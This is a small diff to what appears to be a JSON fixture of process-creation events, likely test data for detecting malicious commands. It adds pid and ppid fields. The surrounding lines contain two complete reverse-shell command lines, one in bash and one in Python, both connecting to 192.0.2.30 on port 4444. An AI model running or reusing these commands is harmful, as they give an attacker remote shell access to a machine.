@@ -4,6 +4,8 @@
     "image": "/usr/bin/bash",
     "commandLine": "bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1",
     "user": "1000",
+    "pid": 5000,
+    "ppid": 4999,
     "currentDirectory": "/home/u"
   },
   {
@@ -11,6 +13,8 @@
     "image": "/usr/bin/python3",
     "commandLine": "python3 -c import socket,subprocess,os;s=socket.socket();s.connect((\"192.0.2.30\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])",
     "user": "1000",
+    "pid": 5001,
+    "ppid": 4999,
     "currentDirectory": "/home/u"
   }
 ]
